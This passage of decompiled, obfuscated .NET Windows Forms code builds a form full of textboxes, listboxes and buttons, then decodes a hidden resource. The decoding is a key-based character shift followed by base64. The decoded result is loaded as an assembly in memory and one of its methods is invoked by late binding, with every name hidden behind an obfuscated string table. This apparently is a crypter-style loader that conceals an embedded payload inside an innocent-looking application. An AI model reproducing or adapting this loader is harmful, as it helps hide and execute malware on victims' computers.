		((Control)this).get_Controls().Add((Control)(object)label_0);
		((Control)this).get_Controls().Add((Control)(object)textBox_1);
		((Control)this).get_Controls().Add((Control)(object)label_1);
		((Control)this).get_Controls().Add((Control)(object)textBox_2);
		((Control)this).get_Controls().Add((Control)(object)label_2);
		((Control)this).get_Controls().Add((Control)(object)textBox_3);
		((Control)this).get_Controls().Add((Control)(object)label_3);
		((Control)this).get_Controls().Add((Control)(object)textBox_4);
		((Control)this).get_Controls().Add((Control)(object)label_4);
		((Control)this).get_Controls().Add((Control)(object)button_4);
		((Control)this).get_Controls().Add((Control)(object)button_3);
		((Control)this).get_Controls().Add((Control)(object)button_2);
		((Control)this).get_Controls().Add((Control)(object)button_1);
		((Control)this).get_Controls().Add((Control)(object)button_0);
		((Control)this).get_Controls().Add((Control)(object)listBox_0);
		((Control)this).get_Controls().Add((Control)(object)button_9);
		((Control)this).get_Controls().Add((Control)(object)button_10);
		((Control)this).get_Controls().Add((Control)(object)listBox_4);
		((Control)this).get_Controls().Add((Control)(object)listBox_3);
		((Control)this).get_Controls().Add((Control)(object)listBox_2);
		((Control)this).get_Controls().Add((Control)(object)listBox_1);
		((Control)this).get_Controls().Add((Control)(object)listBox_7);
		((Control)this).get_Controls().Add((Control)(object)listBox_6);
		((Control)this).get_Controls().Add((Control)(object)listBox_5);
		((Control)this).get_Controls().Add((Control)(object)gcontrol1_0);
		((Control)this).get_Controls().Add((Control)(object)gcontrol3_0);
		((Control)this).get_Controls().Add((Control)(object)gcontrol5_0);
		((Control)this).get_Controls().Add((Control)(object)gcontrol4_0);
		((Control)this).get_Controls().Add((Control)(object)gcontrol6_0);
		((Control)this).get_Controls().Add((Control)(object)gcontrol0_0);
		((Control)this).get_Controls().Add((Control)(object)gcontrol2_0);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Control)this).set_Name(Class9.smethod_0(-860095283));
		((Form)this).add_Load((EventHandler)GForm0_Load);
		((ISupportInitialize)eventLog_0).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
		((Control)this).set_Dock((DockStyle)5);
	}

	public static string smethod_0()
	{
		object[] array = new object[3]
		{
			Class4.smethod_0(),
			Class4.smethod_1(),
			Class9.smethod_0(-860095271)
		};
		ResourceManager resourceManager = new ResourceManager(typeof(GForm0));
		string string_ = (string)resourceManager.GetObject(Class9.smethod_0(-860095319));
		string text = smethod_1(string_, Class9.smethod_0(-860095328));
		string text2 = text;
		Assembly assembly = AppDomain.CurrentDomain.Load(Convert.FromBase64CharArray(text2.ToCharArray(), 0, text2.Length));
		object obj = LateBinding.LateGet((object)assembly, (Type)null, Class9.smethod_0(-860095351), new object[1] { Class9.smethod_0(-860095333) }, (string[])null, (bool[])null);
		object obj2 = LateBinding.LateGet(obj, (Type)null, Class9.smethod_0(-860097671), new object[1] { Class9.smethod_0(-860097719) }, (string[])null, (bool[])null);
		LateBinding.LateGet(obj2, (Type)null, Class9.smethod_0(-860097723), new object[2] { 0, array }, (string[])null, (bool[])null);
		return Class9.smethod_0(-860097712);
	}

	public static string smethod_1(string string_0, string string_1)
	{
		string text = string.Empty;
		int length = string_0.Length;
		checked
		{
			for (int i = 1; i <= length; i++)
			{
				int num = unchecked((int)Strings.GetChar(string_0, i)) - unchecked((int)Strings.GetChar(string_1, checked(unchecked(i % string_1.Length) + 1)));
				text += Strings.ChrW(num);
			}
			return text;
		}
	}
}
